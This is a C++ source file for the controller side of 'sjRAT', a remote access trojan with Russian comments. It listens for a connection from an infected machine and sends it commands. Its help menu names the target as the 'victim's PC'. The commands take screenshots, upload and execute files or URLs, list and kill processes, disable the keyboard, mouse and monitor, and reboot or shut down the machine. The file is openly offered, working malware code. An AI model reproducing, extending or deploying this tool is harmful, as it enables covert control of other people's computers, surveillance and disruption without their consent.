#include "includes.h"

std::string GenerateRandomFilename()
{
    const std::string characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    const int length = 8;  // Длина случайного имени файла

    std::random_device rd; // gets random seed for generation
    std::mt19937 generator(rd());
    std::uniform_int_distribution<int> distribution(0, characters.size() - 1); // generate random index

    std::string randomFilename;
    for (int i = 0; i < length; ++i)
    {
        int index = distribution(generator);
        randomFilename += characters[index];
    }

    return randomFilename;
}

void ReceiveFile(SOCKET client, const std::string& filename)
{
    std::ofstream file(filename, std::ios::binary);
    if (!file)
    {
        printf("[!] Failed to create file: %s\n", filename.c_str());
        return;
    }

    // Получаем размер файла от клиента
    std::streampos fileSize;
    int bytesReceived = recv(client, reinterpret_cast<char*>(&fileSize), sizeof(fileSize), 0);
    if (bytesReceived <= 0)
    {
        printf("[!] Failed to receive file size\n");
        file.close();
        std::remove(filename.c_str()); // Удаляем созданный файл
        return;
    }

    // Выделяем буфер для приема файла
    char* buffer = new char[FILE_BUFF_SIZE];

    // Принимаем файл по частям и записываем в файл
    while (fileSize > 0)
    {
        // Получаем очередную часть файла
        int bytesReceived = recv(client, buffer, FILE_BUFF_SIZE, 0);
        if (bytesReceived <= 0)
        {
            printf("[!] Failed to receive file\n");
            break;
        }

        // Записываем принятые данные в файл
        file.write(buffer, bytesReceived);

        // Уменьшаем оставшийся размер файла
        fileSize -= bytesReceived;
    }

    // Освобождаем ресурсы
    delete[] buffer;
    file.close();

    if (fileSize <= 0)
    {
        printf("[*] File received: %s\n", filename.c_str());
    }
    else
    {
        printf("[!] Failed to receive complete file: %s\n", filename.c_str());
        std::remove(filename.c_str()); // Удаляем частично принятый файл
    }
}

void SendFile(SOCKET client, char* filename) 
{
    std::ifstream file(filename, std::ios::binary);
    if (!file) {
        printf("[!] Failed to open file: %s\n", filename);
        return;
    }

    // Получаем размер файла
    file.seekg(0, std::ios::end);
    std::streampos fileSize = file.tellg();
    file.seekg(0, std::ios::beg);

    // Выделяем буфер для чтения файла
    char* buffer = new char[FILE_BUFF_SIZE];

    // Отправляем клиенту размер файла
    send(client, reinterpret_cast<char*>(&fileSize), sizeof(fileSize), 0);

    // Читаем и отправляем файл по частям
    while (fileSize > 0) {
        // Читаем очередную часть файла
        std::streamsize bytesRead = file.readsome(buffer, FILE_BUFF_SIZE);
        if (bytesRead <= 0) {
            printf("[!] Failed to read file: %s\n", filename);
            break;
        }

        // Отправляем прочитанные данные клиенту
        int bytesSent = send(client, buffer, bytesRead, 0);
        if (bytesSent <= 0) {
            printf("[!] Failed to send file: %s\n", filename);
            break;
        }

        // Уменьшаем оставшийся размер файла
        fileSize -= bytesSent;
    }

    // Освобождаем ресурсы
    delete[] buffer;
    file.close();

    printf("[*] File sent: %s\n", filename);
}

void SendAndReceive(SOCKET client, std::string command)
{
    send(client, command.c_str(), command.size(), 0);
    char buff[1024];
    int bytesReceived = recv(client, buff, sizeof(buff), 0);
    if (bytesReceived > 0) {
        buff[bytesReceived] = '\0';
        printf("[*] %s\n", buff);
    }
}

void help_menu()
{
    printf("==============HELP-MENU==============\n");
    printf("sysinfo - see information about victim's PC\n\n");
    printf("msgbox - summon MessageBox on victim's PC\n\n");
    printf("beep <sec> - play weird sound for X sec on victim's PC\n\n");
    printf("upload <file> - send file to victim's PC\n\n");
    printf("execute <file/url> - lauch file or open url\n\n");
    printf("reboot - reboot victim's PC\n\n");
    printf("shutdown - turn off victim's PC\n\n");
    printf("ping - show latency\n\n");
    printf("monitor off/on - turn off/on victim's monitor\n\n");
    printf("keyboard off/on - disable/enable keyboard\n\n");
    printf("mouse off/on - disable/enable mouse\n\n");
    printf("play <file> - play music from file\n\n");
    printf("help - see this message\n\n");
    printf("exit - exit sjRAT and terminate client session\n\n");
    printf("=====================================\n");
}

void banner()
{
    printf("=========================https://github.com/Quality15/sjRAT========================\n");
    printf("   d888888o.             8 8888 8 888888888o.            .8.    8888888 8888888888 \n");
    printf(" .`8888:' `88.           8 8888 8 8888    `88.          .888.         8 8888       \n");
    printf(" 8.`8888.   Y8           8 8888 8 8888     `88         :88888.        8 8888       \n");
    printf(" `8.`8888.               8 8888 8 8888     ,88        . `88888.       8 8888       \n");
    printf("  `8.`8888.              8 8888 8 8888.   ,88'       .8. `88888.      8 8888       \n");
    printf("   `8.`8888.             8 8888 8 888888888P'       .8`8. `88888.     8 8888       \n");
    printf("    `8.`8888. 88.        8 8888 8 8888`8b          .8' `8. `88888.    8 8888       \n");
    printf("8b   `8.`8888.`88.       8 888' 8 8888 `8b.       .8'   `8. `88888.   8 8888       \n");
    printf("`8b.  ;8.`8888  `88o.    8 88'  8 8888   `8b.    .888888888. `88888.  8 8888       \n");
    printf(" `Y8888P ,88P'    `Y888888 '    8 8888     `88. .8'       `8. `88888. 8 8888       \n");
    printf("================================v%s=============================================\n", VERSION.c_str());
}

void MeasurePingTime(SOCKET client)
{
    // Отправляем текущее время клиенту
    auto start = std::chrono::high_resolution_clock::now();
    send(client, reinterpret_cast<char*>(&start), sizeof(start), 0);

    // Получаем время отклика от клиента
    std::chrono::high_resolution_clock::time_point end;
    int bytesReceived = recv(client, reinterpret_cast<char*>(&end), sizeof(end), 0);
    if (bytesReceived == sizeof(end)) {
        // Вычисляем время отклика
        auto duration = std::chrono::duration_cast<std::chrono::microseconds>(end - start);
        double pingTime = duration.count() / 1000.0;  // Конвертируем в миллисекунды
        printf("[*] Ping time: %.2f ms\n", pingTime);
    }
    else {
        printf("Failed to measure ping time\n");
    }
}

int main(int argc, char* argv[])
{
    char ip_addr[] = "192.168.31.135";
    int port = 4444;

    // Show banner
    banner();

    // Startup WinSock
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    WSADATA wsaData;
    WORD DllVersion = MAKEWORD(2, 1);
    if (WSAStartup(DllVersion, &wsaData) != 0)
    {
        printf("WinSock startup failed\n");
        exit(1);
    }

    SOCKADDR_IN addr;
    int sizeofaddr = sizeof(addr);
    addr.sin_addr.s_addr = htonl(INADDR_ANY); // to public connections | inet_addr("127.0.0.1") <- connections only from local network
    // addr.sin_addr.s_addr = inet_addr(ip_addr);
    addr.sin_port = htons(port); // port
    addr.sin_family = AF_INET; // IPv4

    SOCKET sListen = socket(AF_INET, SOCK_STREAM, NULL); // socket that listens for connetions
    bind(sListen, (SOCKADDR*)&addr, sizeof(addr)); // bind address to the socket
    printf("[*] Listening for connections...\n");
    listen(sListen, SOMAXCONN); // start listen for connections

    SOCKET client;
    client = accept(sListen, (SOCKADDR*)&addr, &sizeofaddr); // accept client connection
    if (client == 0)
    {
        printf("Failed to accept client's connection\n%d\n", WSAGetLastError());
        exit(1);
    } else {
        // Get connected client IP
        struct sockaddr_in addr_in;
        int addrSize = sizeof(addr_in);
        getpeername(client, (struct sockaddr*)&addr_in, &addrSize);
        const char* clientIP = inet_ntoa(addr_in.sin_addr);
        printf("[+] New connection from %s!\n", clientIP);
        
        bool clientConnected = true;

        std::string command;
        while (true) 
        {
            std::cout << "sj> ";
            std::getline(std::cin, command);

            if (command == "msgbox") {
                SendAndReceive(client, command);
            }
            else if (command.substr(0, 4) == "beep") {
                if (command.length() > 4) {
                    std::string durStr = command.substr(5);
                    if (durStr.length() > 0) {
                        int dur = std::stoi(durStr);
                        SendAndReceive(client, command);
                    } else {
                        printf("[!] Usage: beep <duration (in seconds)>\n");
                    }
                } else {
                    printf("[!] Usage: beep <duration (in seconds)>\n");
                }
            }
            else if (command == "sysinfo" || command == "systeminfo" || command == "info") {
                SendAndReceive(client, command);
            }
            else if (command.substr(0, 6) == "upload") {
                if (command.length() > 6) {
                    std::string filename = command.substr(7);
                    SendAndReceive(client, command);
                    SendFile(client, &filename[0]);
                } else {
                    printf("[!] Usage: upload <filename>\n");
                }
            }
            else if (command.substr(0, 7) == "execute") {
                SendAndReceive(client, command);
            }
            else if (command == "shutdown") {
                SendAndReceive(client, command);
            }
            else if (command == "reboot") {
                SendAndReceive(client, command);
            }
            else if (command == "ping") {
                MeasurePingTime(client);
            }
            else if (command.substr(0, 8) == "keyboard") {
                std::string state = command.substr(9);
                if (state == "on") {
                    SendAndReceive(client, command);
                } else if (state == "off") {
                    SendAndReceive(client, command);
                } else {
                    printf("[!] Usage: keyboard off/on\n");
                }
            }
            else if (command.substr(0, 5) == "mouse") {
                std::string state = command.substr(6);
                if (state == "on") {
                    SendAndReceive(client, command);
                } else if (state == "off") {
                    SendAndReceive(client, command);
                } else {
                    printf("[!] Usage: mouse off/on\n");
                }
            }
            else if (command.substr(0, 7) == "monitor") {
                std::string state = command.substr(8);
                if (state == "on") {
                    SendAndReceive(client, command);
                } else if (state == "off") {
                    SendAndReceive(client, command);
                } else {
                    printf("[!] Usage: monitor off/on\n");
                }
            }
            else if (command == "pids") {
                // SendAndReceive(client, command); // too few bytes
                send(client, command.c_str(), command.size(), 0);
                char buff[2000000];
                int bytesReceived = recv(client, buff, sizeof(buff), 0);
                if (bytesReceived > 0) {
                    buff[bytesReceived] = '\0';
                    printf("[*] %s\n", buff);
                }
            }
            else if (command.substr(0, 4) == "kill") {
                if (command.length() > 4) {
                    std::string pidStr = command.substr(5);
                    SendAndReceive(client, command);
                } else {
                    printf("[!] Usage: kill <pid>\n");
                }
            }
            else if (command == "screenshot") {
                // SendAndReceive(client, command);
                send(client, command.c_str(), command.size(), 0);

                std::string filename = GenerateRandomFilename() + ".bmp";
                ReceiveFile(client, filename);
                printf("[*] Screenshot received: %s\n", filename.c_str());

                // open screenshot
                HINSTANCE hInstance = ShellExecute(NULL, "open", filename.c_str(), NULL, NULL, SW_SHOWMAXIMIZED);
                if ((int)hInstance <= 32)
                {
                    printf("[*] Failed to open %s\n", filename);
                }
            }

            else if (command == "help") {
                help_menu();
            }
            else if (command == "exit" || command == "quit" || command == "bye") {
                SendAndReceive(client, command.c_str());
                closesocket(client);
                clientConnected = false;
                system("pause");
                exit(0);
            }
        }
    }

    system("pause");
}